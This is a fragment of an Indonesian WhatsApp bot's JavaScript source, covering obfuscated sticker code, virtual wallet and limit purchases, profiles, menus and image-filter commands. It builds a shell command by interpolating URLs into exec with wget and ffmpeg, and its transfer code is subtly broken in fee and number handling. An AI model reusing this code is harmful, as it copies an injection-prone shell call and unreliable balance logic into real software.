_0x5ef2ad={};_0x5ef2ad['buttonId']=_0x134458(0x7fd,0x30d,0x93b,0x7dd),_0x5ef2ad[_0x134458(0x454,0x2e7,0x47b,-0x61)]=_0x5b91ad,_0x5ef2ad[_0x15af3d(0xa52,0x7a7,0xe8e,0xcf2)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x15af3d(0x950,0xce4,0x764,0x611)](prefix),'©\x20'+ownername,[_0x5ef2ad]);emoji[_0x15af3d(0xa9d,0xcab,0xdb1,0xedd)](''+q5)[_0x15af3d(0x77c,0x87a,0x8c6,0x9b8)](async _0x447dec=>{const _0x4ef502={'lAwLN':function(_0x5ddd85,_0x46402b,_0x8ce635){return _0x5ddd85(_0x46402b,_0x8ce635);},'FuYxZ':function(_0x374a96,_0x3a2ee0,_0xbff3fe){return _0x374a96(_0x3a2ee0,_0xbff3fe);}};teks=''+_0x447dec[_0x552029(0x762,0xb2f,0x5ed,0x451)][0x2*-0x1047+-0x24f2+0x4585]['url'],console['log'](teks);function _0x552029(_0x583be2,_0x5c10e9,_0x2ef9fa,_0x529b3a){return _0x15af3d(_0x583be2-0x82,_0x5c10e9-0xc8,_0x2ef9fa,_0x529b3a-0x4b);}_0x4ef502[_0x2f2983(0x755,0x502,0x485,0x6a9)](sendStickerFromUrl,from,''+teks);function _0x2f2983(_0x2a8b1d,_0x42b922,_0x4b9c43,_0x43e178){return _0x15af3d(_0x42b922-0x59,_0x42b922-0xc2,_0x4b9c43,_0x43e178-0x1dc);}await _0x4ef502['FuYxZ'](limitAdd,sender,limit);});}if(sub_yt_zeeone_ofc=='Emoji-Face'+_0x134458(0xa17,0xc9e,0x8b7,0xba9)+q5){const _0x29c1ee={};_0x29c1ee[_0x134458(0x599,0x54a,0xa56,0x253)+'t']=_0x134458(0x806,0x4e9,0x8be,0x8ce)+'t';const _0x3f4f04={};_0x3f4f04[_0x134458(0xae0,0x6f6,0xb92,0xb89)]='limit',_0x3f4f04[_0x15af3d(0x5a7,0x44b,0x9f9,0x9c0)]=_0x29c1ee,_0x3f4f04[_0x134458(0x8ff,0x731,0x9f4,0x726)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x134458(0x7fd,0x4b8,0x9e8,0x984)](prefix),'©\x20'+ownername,[_0x3f4f04]);reply(lang[_0x15af3d(0x3cc,0x274,-0xe9,0x55)]()),emoji[_0x15af3d(0xa9d,0x9f8,0xc1f,0x6fd)](''+q5)['then'](async _0x11b0c6=>{function _0x1580d5(_0x510745,_0x50e81b,_0x3d1c31,_0x2e75f3){return _0x15af3d(_0x510745-0x271,_0x50e81b-0x1ee,_0x3d1c31,_0x2e75f3-0x116);}const _0x4d51e6={'lCxbZ':function(_0x191ed2,_0x112f9d,_0x4676d4){return _0x191ed2(_0x112f9d,_0x4676d4);},'ubWLJ':function(_0x3945fc,_0x3468e7,_0x308ed1){return _0x3945fc(_0x3468e7,_0x308ed1);}};function _0x5c4626(_0x5a20f2,_0x1b4329,_0x38edb6,_0x1cbd2f){return _0x15af3d(_0x38edb6- -0x126,_0x1b4329-0xee,_0x1b4329,_0x1cbd2f-0x7b);}teks=''+_0x11b0c6[_0x5c4626(0x2f3,0x1b0,0x5ba,0x8f5)][-0x1290+-0x25f9+0x388f*0x1][_0x5c4626(0x9,0x10f,0x334,0x6d8)],console[_0x5c4626(0xa91,0xbfa,0xa74,0x9e4)](teks),_0x4d51e6[_0x1580d5(0x7c0,0x99a,0x346,0x648)](sendStickerFromUrl,from,''+teks),await _0x4d51e6['ubWLJ'](limitAdd,sender,limit);});}if(sub_yt_zeeone_ofc==_0x15af3d(0x9af,0xbe6,0x746,0xb9c)+'ixels-'+q5){const _0x94d4a2={};_0x94d4a2[_0x15af3d(0x6ec,0x4df,0xb13,0xabb)+'t']='Check\x20Limi'+'t';const _0x56137d={};_0x56137d[_0x134458(0xae0,0xf23,0x688,0xf2e)]=_0x15af3d(0x950,0x511,0xaec,0xbe0),_0x56137d[_0x15af3d(0x5a7,0x5e1,0x2d2,0x140)]=_0x94d4a2,_0x56137d[_0x134458(0x8ff,0x4a9,0x527,0xb70)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x134458(0x7fd,0x572,0x5ca,0xa15)](prefix),'©\x20'+ownername,[_0x56137d]);emoji[_0x134458(0x94a,0x5e2,0xd12,0x7bf)](''+q5)['then'](async _0x28f478=>{function _0x31fccf(_0x4f4f92,_0x4c8faf,_0x54dc6f,_0x4494fc){return _0x134458(_0x4c8faf- -0x176,_0x4c8faf-0xe1,_0x4f4f92,_0x4494fc-0x3e);}const _0x12516b={'HPuKf':function(_0xdfab8d,_0x271068,_0x4a4bc7){return _0xdfab8d(_0x271068,_0x4a4bc7);},'vgnsT':function(_0x542331,_0x17b3ed,_0x487e31){return _0x542331(_0x17b3ed,_0x487e31);}};teks=''+_0x28f478['images'][0x1*-0x11b7+0x1*-0x8eb+0x1aa9][_0x31fccf(0x236,0x191,0x380,-0x17)],console[_0x16f23b(0xe2b,0x96a,0xc1f,0x4d7)](teks),_0x12516b['HPuKf'](sendStickerFromUrl,from,''+teks);function _0x16f23b(_0x2e3b10,_0x51d287,_0xae311a,_0x17d7de){return _0x134458(_0x51d287- -0xdd,_0x51d287-0x1,_0x2e3b10,_0x17d7de-0x187);}await _0x12516b[_0x16f23b(0x567,0x61c,0x248,0xa00)](limitAdd,sender,limit);});}if(sub_yt_zeeone_ofc==_0x15af3d(0x7f9,0x770,0x81e,0x72a)+_0x15af3d(0xae0,0xdf4,0xb10,0x9dc)+q5){const _0xdd12fc={};_0xdd12fc['displayTex'+'t']=_0x15af3d(0x959,0xd3f,0x4b7,0xc98)+'t';const _0x110520={};_0x110520[_0x15af3d(0xc33,0xe9c,0xb6f,0xd22)]=_0x15af3d(0x950,0xced,0xc55,0x533),_0x110520[_0x15af3d(0x5a7,0x336,0x253,0x9e0)]=_0xdd12fc,_0x110520[_0x134458(0x8ff,0xdca,0x8dd,0x908)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang['limit'](prefix),'©\x20'+ownername,[_0x110520]);emoji[_0x15af3d(0xa9d,0x7c9,0xb73,0x962)](''+q5)[_0x134458(0x629,0x1bc,0x52c,0x684)](async _0x3c6035=>{function _0x39cade(_0x721ac3,_0x30eb7f,_0x4da7d8,_0x3c3cb1){return _0x15af3d(_0x30eb7f-0x23d,_0x30eb7f-0x40,_0x721ac3,_0x3c3cb1-0x167);}const _0x1a0341={'SaQgW':function(_0x4ea098,_0x2fab43,_0x580dbe){return _0x4ea098(_0x2fab43,_0x580dbe);}};teks=''+_0x3c6035[_0x39cade(0xc54,0x91d,0xa9e,0xdec)][0x286*0x1+-0x5*-0x1ed+0x1d*-0x6b][_0x4710bf(-0x56b,-0x91,-0x1c3,-0x305)],console[_0x4710bf(0xb83,0x6af,0x49c,0x551)](teks);function _0x4710bf(_0x4c9eb2,_0x1ca6f1,_0x5ba5d2,_0x1c313d){return _0x15af3d(_0x1ca6f1- -0x4eb,_0x1ca6f1-0x18d,_0x1c313d,_0x1c313d-0xe2);}_0x1a0341[_0x4710bf(0x5bf,0x642,0x246,0x34d)](sendStickerFromUrl,from,''+teks),await _0x1a0341[_0x4710bf(0x6a5,0x642,0x884,0x28c)](limitAdd,sender,limit);});}if(sub_yt_zeeone_ofc==_0x15af3d(0x3c2,0x6f,-0x65,0x339)+'idex-'+q5){const _0x385690={};_0x385690[_0x134458(0x599,0x1b0,0x4ab,0x782)+'t']=_0x15af3d(0x959,0xbd1,0x86c,0x662)+'t';const _0x5d44fd={};_0x5d44fd[_0x15af3d(0xc33,0xb78,0xfe4,0x863)]='limit',_0x5d44fd['buttonText']=_0x385690,_0x5d44fd[_0x134458(0x8ff,0x7aa,0xd4e,0x9d1)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x15af3d(0x950,0x6ad,0x84b,0x9ff)](prefix),'©\x20'+ownername,[_0x5d44fd]);reply(lang[_0x134458(0x279,-0x24b,0x5ff,0x593)]()),emoji[_0x134458(0x94a,0x849,0xa00,0xb31)](''+q5)[_0x134458(0x629,0x9a5,0x1ce,0x8af)](async _0x4abd79=>{function _0x315ddd(_0x558dd8,_0x1c85d5,_0x3e153c,_0x1d1dbb){return _0x15af3d(_0x1d1dbb-0x221,_0x1c85d5-0x78,_0x3e153c,_0x1d1dbb-0xd);}const _0x51e658={'hsVbS':function(_0x294b0a,_0x193e4c,_0x178c27){return _0x294b0a(_0x193e4c,_0x178c27);},'WbyJR':function(_0x4f46b9,_0x53b3ed,_0x595d85){return _0x4f46b9(_0x53b3ed,_0x595d85);}};teks=''+_0x4abd79[_0x315ddd(0x575,0xd59,0x45d,0x901)][-0x4*-0x3f5+-0x1*-0x21e0+-0x1*0x31ab][_0x315ddd(0x2fd,0x9d4,0x8fa,0x67b)];function _0x365445(_0x7ba32c,_0x88f6,_0x3ccdb6,_0x12f1a8){return _0x15af3d(_0x3ccdb6- -0x4e4,_0x88f6-0x4f,_0x12f1a8,_0x12f1a8-0xb6);}console[_0x315ddd(0xdca,0xc3a,0xcdd,0xdbb)](teks),_0x51e658['hsVbS'](sendStickerFromUrl,from,''+teks),await _0x51e658[_0x365445(0xac9,0x3af,0x752,0x85b)](limitAdd,sender,limit);});}if(sub_yt_zeeone_ofc==_0x15af3d(0x9a6,0x531,0x4c1,0xc16)+_0x134458(0x8cb,0x7be,0x86e,0x45d)+q5){const _0x26ac77={};_0x26ac77[_0x134458(0x599,0x7e8,0x608,0x535)+'t']=_0x134458(0x806,0x5a3,0xa05,0x383)+'t';const _0x262b86={};_0x262b86[_0x134458(0xae0,0x997,0x722,0xd1a)]=_0x15af3d(0x950,0x9dc,0x7ac,0x81d),_0x262b86['buttonText']=_0x26ac77,_0x262b86[_0x15af3d(0xa52,0xc92,0xa5f,0xf10)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x15af3d(0x950,0xd77,0x992,0xd46)](prefix),'©\x20'+ownername,[_0x262b86]);emoji[_0x15af3d(0xa9d,0x707,0xcf1,0x667)](''+q5)[_0x15af3d(0x77c,0xa13,0x8ce,0x55f)](async _0x7100e0=>{function _0x3714e6(_0x387fd3,_0x185809,_0x137508,_0x12cad3){return _0x134458(_0x12cad3-0x379,_0x185809-0x1f4,_0x185809,_0x12cad3-0x18e);}function _0x495a50(_0x2189f6,_0x350622,_0x2d7131,_0x3dceaf){return _0x15af3d(_0x2189f6- -0x2a3,_0x350622-0xd8,_0x2d7131,_0x3dceaf-0xe6);}const _0x496037={'IXLVX':function(_0x40abb4,_0x44c935,_0x1e60fc){return _0x40abb4(_0x44c935,_0x1e60fc);},'ORjmH':function(_0x5ea2be,_0xc460f0,_0x1006a4){return _0x5ea2be(_0xc460f0,_0x1006a4);}};teks=''+_0x7100e0[_0x3714e6(0xafa,0x97e,0xc7e,0x906)][0x174c+0x18d*-0x1+-0x15b5][_0x495a50(0x1b7,0x417,0x300,-0x2ad)],console[_0x3714e6(0x123d,0xf01,0x11d8,0xdc0)](teks),_0x496037['IXLVX'](sendStickerFromUrl,from,''+teks),await _0x496037[_0x495a50(0x979,0x523,0x826,0x72d)](limitAdd,sender,limit);});}if(sub_yt_zeeone_ofc=='Emoji-LG-'+q5){const _0x30e235={};_0x30e235['displayTex'+'t']=_0x134458(0x806,0xa71,0x8c5,0x66b)+'t';const _0x1f3ec2={};_0x1f3ec2[_0x134458(0xae0,0xacf,0xa16,0x88b)]=_0x15af3d(0x950,0xa07,0xcf9,0x8f9),_0x1f3ec2[_0x134458(0x454,0x519,-0x9c,0x588)]=_0x30e235,_0x1f3ec2[_0x134458(0x8ff,0x7d8,0x553,0x99f)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x15af3d(0x950,0xadf,0x577,0xa6f)](prefix),'©\x20'+ownername,[_0x1f3ec2]);reply(lang['wait']()),emoji[_0x15af3d(0xa9d,0xaf7,0xbb0,0x9c5)](''+q5)[_0x134458(0x629,0x203,0x94e,0x249)](async _0x32430a=>{const _0x1e76c4={'hIQsL':function(_0x44e94d,_0x2d5157,_0x5f17ff){return _0x44e94d(_0x2d5157,_0x5f17ff);},'fBkOv':function(_0x4d3f23,_0x55b93f,_0x1d4784){return _0x4d3f23(_0x55b93f,_0x1d4784);}};teks=''+_0x32430a[_0x3342ad(0x218,0x7ba,0x6f4,0x6b9)][0x23da+0x2*0x10d3+0x1*-0x4575][_0x3342ad(0x83b,0x4a1,0x46e,0x623)],console[_0x3342ad(0xb56,0x7bb,0xbae,0x7b1)](teks);function _0x3342ad(_0x199129,_0x589e26,_0x3924a6,_0x3c26e9){return _0x134458(_0x3924a6-0x167,_0x589e26-0x20,_0x199129,_0x3c26e9-0x183);}function _0x5283fc(_0x41d71d,_0x345919,_0x2bc5b1,_0x8c7d3f){return _0x15af3d(_0x8c7d3f- -0x31b,_0x345919-0x169,_0x41d71d,_0x8c7d3f-0x88);}_0x1e76c4[_0x5283fc(0x10e,0x4a,0x613,0x375)](sendStickerFromUrl,from,''+teks),await _0x1e76c4['fBkOv'](limitAdd,sender,limit);});}if(sub_yt_zeeone_ofc=='Emoji-HTC-'+q5){const _0x297804={};_0x297804['displayTex'+'t']=_0x134458(0x806,0x502,0xb62,0x46c)+'t';const _0x329c72={};_0x329c72['buttonId']=_0x15af3d(0x950,0x7d9,0xb6e,0xc9d),_0x329c72[_0x134458(0x454,0x1a,0x915,0x686)]=_0x297804,_0x329c72[_0x15af3d(0xa52,0xcd5,0x889,0x7c6)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang['limit'](prefix),'©\x20'+ownername,[_0x329c72]);emoji[_0x15af3d(0xa9d,0xe6c,0xf04,0xdfb)](''+q5)['then'](async _0x496399=>{const _0x1a6b70={'gMTmA':function(_0x1392d0,_0x4a2749,_0x161899){return _0x1392d0(_0x4a2749,_0x161899);}};teks=''+_0x496399[_0x36310d(0x94d,0x5c1,0x6f1,0x21c)][0x16*0xa6+0xa03+-0x183b*0x1][_0x36310d(0x2ce,0x7ad,0x46b,0x417)];function _0x603691(_0x195505,_0xc18d3d,_0x4cc97f,_0x7cb246){return _0x134458(_0xc18d3d-0x3dd,_0xc18d3d-0x66,_0x4cc97f,_0x7cb246-0x13b);}console[_0x603691(0x983,0xe24,0x1076,0x1193)](teks),_0x1a6b70[_0x603691(0xe38,0xebf,0xe16,0xae4)](sendStickerFromUrl,from,''+teks);function _0x36310d(_0x383ad4,_0x3a6c8b,_0x4abe86,_0x568b66){return _0x15af3d(_0x4abe86-0x11,_0x3a6c8b-0xb6,_0x383ad4,_0x568b66-0x115);}await _0x1a6b70[_0x36310d(0x105a,0xced,0xc46,0xa69)](limitAdd,sender,limit);});}
switch (command) {
case 'dompet':
					const kantong = checkATMuser(sender)
					reply(` *「 ATM USER 」* \n📛 *Nama* : ${pushname}\n🆔 *Nomer* : ${sender.split("@")[0]}\n💰 *Uang* : ${kantong}\n`)
					break
	case 'transfer':
				if (!q.includes('|')) return  reply('format salah')
                			const tujuan = q.substring(0, q.indexOf('|') - 1)
                			const jumblah = q.substring(q.lastIndexOf('|') + 1)
                			if(isNaN(jumblah)) return await reply('jumlah harus berupa angka!!')
                			if (jumblah < 100 ) return reply(`Minimal Transfer 100`)
                			if (checkATMuser(sender) < jumblah) return reply(`uang mu tidak mencukupi untuk melakukan transfer`)
                			const tujuantf = `${tujuan.replace("@", '')}`
               				fee = 0.005 *  jumblah
                			hasiltf = jumblah + fee
                			addKoinUser(`${tujuantf}@s.whatsapp.net`, hasiltf)
                			confirmATM(sender, hasiltf)
                			reply(`*「 SUKSES  」*\n\npengiriman uang telah sukses\ndari : +${sender.split("@")[0]}\nke : +${tujuan}\njumblah transfer : ${jumblah}\npajak : 30*jumblah`)
                			break
	case 'limit': case 'ceklimit': case 'balance': case 'glimit':
reply(`💳 Limit : ${isPremium ? 'Unlimited Premium' : `${getLimit(sender, limitawal, limit)} / ${limitawal}`}
🏧 Limit Game : ${cekGLimit(sender, gcount, glimit)} / ${gcount}
🏦 Balance : $${getBalance(sender, balance)}


Kamu Dapat Membeli Limit Dengan ${prefix}Buylimit *Nominal* Dan ${prefix}Buyglimit *Nominal* Untuk Membeli Game Limit

*Example :*
${prefix}buylimit 10
${prefix}buyglimit 10

NOTE : 
- Harga Limit Perlimit adalah $100 balance`)
break
case 'buylimit':{
if (!q) return reply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = $100 balance`)
if (q.includes('-')) return reply(`Jangan menggunakan -`)
if (isNaN(q)) return reply(`Harus berupa angka`)
let ane = Number(nebal(q) * 100)
if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
kurangBalance(sender, ane, balance)
giveLimit(sender, nebal(q), limit)
reply(`Pembeliaan limit sebanyak ${q} berhasil

*🏧 Sisa Balance : $${getBalance(sender, balance)}*
*🏦 Sisa Limit : ${getLimit(sender, limitawal, limit)} / ${limitawal}*`)
}
break
case 'buyglimit':{
if (!q)return reply(`Example : ${prefix + command} 10\n\nHarga 1 limit = $100 balance`)
if (q.includes('-')) return reply(`Jangan menggunakan -`)
if (isNaN(q)) return reply(`Harus berupa angka`)
const koinPerlimit = 100
const total = koinPerlimit * q
if (getBalance(sender,balance) <= total) return reply(`maaf Balance kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
kurangBalance(sender, total, balance)
givegame(sender, q, glimit)
reply(`Pembeliaan game limit sebanyak ${q} berhasil

*💳 Sisa Balance : $${getBalance(sender, balance)}*
*💷 Sisa Game Limit : ${cekGLimit(sender, gcount, glimit)} / ${gcount}*`)
}
break
	case 'me': case 'myinfo': case 'info': case 'profile': case 'profil':{
let cek = ms( await premium.getPremiumExpired(sender, premium) - Date.now())
let userProcfile = `「 *USER INFO* 」

📛 Nama : ${pushname}
💋 Bio : ${bio_user}
🔗 Tag : @${sender.split("@")[0]}
💥 Api : wa.me/${sender.split("@")[0]}

💹 Limit : ${isPremium ? 'Unlimited Premium' : `${getLimit(sender, limitawal, limit)} / ${limitawal}`}
💳 Game Limit : ${cekGLimit(sender, gcount, glimit)} / ${gcount}
💷 Balance : $${getBalance(sender, balance)}
👛 Dompet : ${checkATMuser(sender)}
💱 Role : ${role}
🏧 Level : ${getLevelingLevel(sender)}
🏦 Xp : ${getLevelingXp(sender)}

💌 Status : ${isPremium? `Premium User` : `Free user`}
⏰ Expired Prem : ${isPremium ? 'Unlimited Premium' : ` ${cek.days} d, ${cek.hours} h, ${cek.minutes} m, ${cek.seconds} s`}
👨‍?? Register : ${isRegister? `Done`:`Belum Daftar`}
🚫 Baned : ${isBanned?`True`:`False`}`
let papakpo = [{
										"buttonId": `inv`,
										"buttonText": {
											"displayText": "INVENTORY"
											},
										"type": "RESPONSE"
										},{
										"buttonId": `sewabot`,
										"buttonText": {
											"displayText": "SEWA"
											},
										"type": "RESPONSE"
										}]
								sendButLocation(from, userProcfile , `NOTE ！\nJika whatsapp mod kamu belum support button silahkan tonton video ini https://youtu.be/ERGID4Fmo9w\n\n${botname}™© | By ${ownername}`,pp_userz, papakpo, {contextInfo: { mentionedJid: [sender]}})
}
break
	case 'verify': case 'daftar':
 if (isRegister) return reply('Kamu sudah terdaftar di dalam database')
 addRegisterUser(sender, pushname, bio_user, wib)
 let ran_blc = randomNomor(50)
 addBalance(sender, ran_blc, balance)
fs.writeFileSync('./database/user/register.json', JSON.stringify(register))
teks = `╭─❒ *Verification* ❒\n│📛 *Nama :* ${pushname}\n│#️⃣ *Nomor :* @${sender.split('@')[0]}\n│💌 *Bio :* ${bio_user}\n│⏰ *Time :* ${wib}\n╰❒ *Success*`
let papako = [{
										"buttonId": `menu`,
										"buttonText": {
											"displayText": "MENU"
											},
										"type": "RESPONSE"
										},{
										"buttonId": `me`,
										"buttonText": {
											"displayText": "PROCFILE"
											},
										"type": "RESPONSE"
										}]
								sendButLocation(from, teks , `Thank for verification 💋\n${botname}™© | By ${ownername}`,pp_userz, papako, {contextInfo: { mentionedJid: [sender]}})
                break
	case 'menu': case 'help':
			try {
				chatt = await alpha.getProfilePicture(sender)
				} catch {
				chatt = 'https://l.top4top.io/p_20670hd6v1.jpg'
				}
			let ch = await getBuffer(chatt)
koko = `${targetpc}@s.whatsapp.net`
let content = fs.readFileSync(`image/${thumbnail}`)
const media = await alpha.prepareMessage(from, content, MessageType.image, { thumbnail:fs.readFileSync(`image/${thumbnail}`)})
let bacotlu = media.message["ephemeralMessage"] ? media.message.ephemeralMessage : media
let p1 = await alpha.getStatus(sender)
anunya = process.uptime()
ini_anu =`${ucapannya2}

╭─❒ 「 Bot Info 」 
├ Creator :  @${koko.split('@')[0]}
├ Powered  : @${ini_mark.split('@')[0]}
├ Prefix :   ${prefix}
├ Total hit : ${require('util').inspect(hitall(sender))}
├ Hit today : ${hit_today.length}
├ Speed : ${latensii.toFixed(4)} Second
├ Hostname : ${os.hostname()}
├ Platform : ${os.platform()}
├ Runtime : ${(kyun(os.uptime()))}
├ Battery : ${isBattre}
╰❒ Charging : ${isCharge}

╭─❒ 「 User Info 」 
├ Name : ${pushname}
├ Bio : ${p1 ? `${p1.status}` : '-'}
├ Nomor : @${sender.split('@')[0]}
├ Me : ${mek.key.fromMe ? 'True' : 'False'}
╰❒ Owner : ${isOwner ? 'True' : `False`}
`
if(typemenu == 'document'){
sendButDoc(from, ini_anu, `Please Don't spam bot, pause 3 seconds per command!\n`, sender, koko, ini_mark)
} 
if(typemenu == 'troli'){
sendTroli(allmenu(kyun, os, prefix, wita, wit, ucapannya2, timuu, status, wa_version, mcc, mnc, os_version, device_manufacturer, device_model, alfa , alfa1, thisDay, ini_tanggal, totalchat, hit_today, ini_gcchat, latensii))
} 
if(typemenu == 'troli2'){
sendTroli2(allmenu(kyun, os, prefix, wita, wit, ucapannya2, timuu, status, wa_version, mcc, mnc, os_version, device_manufacturer, device_model, alfa , alfa1, thisDay, ini_tanggal, totalchat, hit_today, ini_gcchat, latensii))
} 
if(typemenu == 'katalog'){
sendKatalog2(allmenu(kyun, os, prefix, wita, wit, ucapannya2, timuu, status, wa_version, mcc, mnc, os_version, device_manufacturer, device_model, alfa , alfa1, thisDay, ini_tanggal, totalchat, hit_today, ini_gcchat, latensii))
} 
if(typemenu == 'katalog2'){
sendKatalog3(allmenu(kyun, os, prefix, wita, wit, ucapannya2, timuu, status, wa_version, mcc, mnc, os_version, device_manufacturer, device_model, alfa , alfa1, thisDay, ini_tanggal, totalchat, hit_today, ini_gcchat, latensii))
} 
if(typemenu == 'list'){
sendList(sender)
} 
if(typemenu == 'location'){ 
let content1 = fs.readFileSync(`image/${thumbnail}`)
const media1 = await alpha.prepareMessage(from, content1, MessageType.location, {thumbnail: content1})
let bacotlu1 = media1.message["ephemeralMessage"] ? media1.message.ephemeralMessage : media1

const buttons1 = [
  {buttonId: 'owner', buttonText: {displayText: '⋮☰ OWNER'}, type: 1},
  {buttonId: 'botstat', buttonText:{displayText: '✓ STATISTIC'}, type: 1},
  {buttonId: 'Command', buttonText: {displayText: '❍ LIST MESSAGE'}, type: 1}
]

const btn1 = {
    contentText: allmenu(kyun, os, prefix, wita, wit, ucapannya2, timuu, status, wa_version, mcc, mnc, os_version, device_manufacturer, device_model, alfa , alfa1, thisDay, ini_tanggal, totalchat, hit_today, ini_gcchat, latensii),
    footerText: `${tampilTanggal}${enter}${tampilWaktu}${enter}${enter}Regard @${koko.split('@')[0]}`,
    buttons: buttons1,
    headerType: 6,
    locationMessage: bacotlu1.message.locationMessage
}

alpha.sendMessage(from,  btn1, MessageType.buttonsMessage,{
        caption: 'Botwea ©2k21',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "mentionedJid" : [sender,koko,ini_mark],
            },
			quoted: fkontak,sendEphemeral: true 
			})
}

break
case 'setmenu':
if (!isOwner && !isCreator && !mek.key.fromMe) return reply(lang.onlyOwner())
const listhades = ['document', 'troli', 'troli2', 'katalog', 'katalog2', 'list', 'location']
if (!listhades.includes(q)) return reply(`*Example :*${enter}•${prefix + command} location\n•${prefix + command} document\n•${prefix + command} list\n•${prefix + command} troli\n•${prefix + command} troli2\n•${prefix + command} katalog\n•${prefix + command} katalog2\n`)
typemenu = q
reply(lang.success())
break
case 'setlang':
         if (!isOwner && !isCreator && !mek.key.fromMe) return reply(lang.onlyOwner())
if(args[0] == 'ind'){
lang = ind
reply('Sukses mengubah bahasa ke ind')
}else if(args[0] == 'eng'){
lang = eng
reply('Success changing language to eng')
}else if(args[0] == 'es'){
lang = es
reply('Éxito cambiando el idioma a es')
}else if(args[0] == 'ml'){
lang = ml
reply('ഭാഷയിലേക്ക് മാറ്റുന്നതിൽ വിജയം ml')
}else if(args[0] == 'pt'){
lang = pt
reply('Sucesso ao alterar o idioma para pt')
}else if(args[0] == 'ru'){
lang = ru
reply('Успешно сменил язык на ru')
}else {
reply(`Example : ${prefix + command} eng\n\nAvailable\n•ind - Indonesia\n•eng - English\n•es - Spanish\n•ml - Malayalam\n•pt - Portugis\n•ru - Russian`)
}
break
                case 'allmenu':
                let papao = [{
										"buttonId": `owner`,
										"buttonText": {
											"displayText": "OWNER"
											},
										"type": "RESPONSE"
										},{
										"buttonId": `sewabot`,
										"buttonText": {
											"displayText": "SEWA"
											},
										"type": "RESPONSE"
										},{
										"buttonId": 'Command',
										"buttonText": {
											"displayText": "LIST MESSAGE"
											},
										"type": "RESPONSE"
										}]
								sendButLocation(from, allmenu(kyun, os, prefix, wita, wit, ucapannya2, timuu, status, wa_version, mcc, mnc, os_version, device_manufacturer, device_model, alfa , alfa1, thisDay, ini_tanggal, totalchat, hit_today, ini_gcchat, latensii), `NOTE ！\nJika whatsapp mod kamu belum support button silahkan tonton video ini https://youtu.be/ERGID4Fmo9w\n\n${botname}™© | By ${ownername}`,pp_userz, papao, {})
                break
        case 'trigger':
					reply ('Mungkin yg kamu maksud .triggered')
					await limitAdd(sender, limit)
					break
					case 'sampah':
					if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return sendButMessage(from, lang.limit(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
					var imgbb = require('imgbb-uploader')
	                 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	                 ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					console.log(color(time, 'magenta'), color('Downloading sticker...'))
					media = await alpha.downloadMediaMessage(ger)
					njay = await uploadImages(media)
                    titid = await fetchJson(`https://nekobot.xyz/api/imagegen?type=trash&url=${njay}`, {method: 'get'})
                    buffer = await getBuffer(titid.message)
					alpha.sendMessage(from, buffer, image, {caption : lang.success(),quoted: mek})
                   }
                   await limitAdd(sender, limit)
              break       
		case 'triggered':case 'gay': case 'glass': case 'passed': case 'jail': case 'comrade':case 'green': case 'blue': case 'sepia': case 'wasted': case 'greyscale': case 'blurple2': case 'blurple': case 'red': case 'invertgreyscale': case 'invert':
		if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return sendButMessage(from, lang.limit(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					owgi = await alpha.downloadMediaMessage(ger)
				    anu = await uploadImages(owgi)
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu4 = `https://some-random-api.ml/canvas/${command}?avatar=${anu}`
					exec(`wget ${anu4} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(lang.tryAgain())
					alpha.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
					fs.unlinkSync(rano)
					})
					} else {
					reply('Gunakan foto!')
					}
					await limitAdd(sender, limit)
					break 
					case 'jadian':
					if (isLimit(sender, isPremium, isCreator, isOwner, limitawal, limit)) return sendButMessage(from, lang.limit(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
jds = []
jdii = groupMembers
koss = groupMembers
akuu = jdii[Math.floor(Math.random() * jdii.length)]
diaa = koss[Math.floor(Math.random() * koss.length)]
teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]}  (♥️ ) @${diaa.jid.split('@')[0]} `
jds.push(akuu.jid)
jds.push(diaa.jid)
mentions(teks, jds, true)
await limitAdd(sender, limit)
break
   case 'group': 
   case 'gc': 
                if (!isGroup) return reply(lang.onlygc());
        if (!isGroupAdmins && !isBotGroupAdmins) return reply(lang.onlygcAdmin());
        if (args[0] == "open") {
          await alpha.groupSettingChange(from, GroupSettingChange.messageSend, false)
					fakegroup('S U C C E S S  O P E N I N G  G R O U P')
        } else if (args[0] == "close") {
          await alpha.groupSettingChange(from, GroupSettingChange.messageSend, true)
					fakegroup('S U C C E S S  C L O S I N G  G R O U P')
        } else if (!q) {
